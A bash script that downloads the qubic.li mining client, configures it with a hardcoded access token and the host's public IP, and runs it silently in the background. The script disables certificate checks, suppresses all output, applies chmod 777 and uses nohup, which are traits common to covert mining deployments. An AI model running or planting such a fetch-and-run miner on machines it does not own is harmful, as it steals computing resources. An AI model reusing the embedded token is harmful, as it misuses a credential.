#!/bin/bash

token="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImUwNDUwZTdmLWQ0OGEtNDkwYy1hZTg3LWQyMDhhODM0ZGE2MSIsIk1pbmluZyI6IiIsIm5iZiI6MTczMzYyMjk1OSwiZXhwIjoxNzY1MTU4OTU5LCJpYXQiOjE3MzM2MjI5NTksImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.f9D0BUbviaTYhSRQO0yu2QoVZF25OHMYOD0-u5bR4IEbw3eWgyL4rlvN5wN7rXLE91YsooRYcJPMazi7eotXA-vcBXzOQ8HwT42eWq6PqdPP8n_g_uu_RMQOcQbfXgC9YYfEAscsFvvLn8IKETrwlgh2KG2GJSTQhM-uZIvcI0XGflXp9ja8YyHdBQFkdy3LSuz9lhRzaW_4ZD9qx8EKFO8ez5S8ejVD3F5S0MezyGmofx0rXt4EdZ6BMnNe3bCwDmQ4vZMjvHvT0KsN-XDOByiazADFWITJth3kHFMQ-nDUbluWtpI6WcRT-gBDLq013TLcxLEMQSVu0EGw4AVqmQ"
version="3.1.1"
hugepage="128"
work=`mktemp -d`

cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
addr=`wget --no-check-certificate -qO- http://checkip.amazonaws.com/ 2>/dev/null`
[ -n "$addr" ] || addr="NULL"

wget --no-check-certificate -qO- "https://dl.qubic.li/downloads/qli-Client-${version}-Linux-x64.tar.gz" |tar -zx -C "${work}"
[ -f "${work}/qli-Client" ] || exit 1

cat >"${work}/appsettings.json"<< EOF
{
  "ClientSettings": {
    "pps": false,
    "accessToken": "${token}",
    "alias": "${addr}",
    "trainer": {
      "cpu": true,
      "gpu": false
    },
    "autoUpdate": false
  }
}
EOF


sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget icu-devtools >/dev/null 2>&1 || apt -qqy install wget icu-devtools >/dev/null 2>&1
sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1


chmod -R 777 "${work}"
cd "${work}"
nohup ./qli-Client >/dev/null 2>&1 &
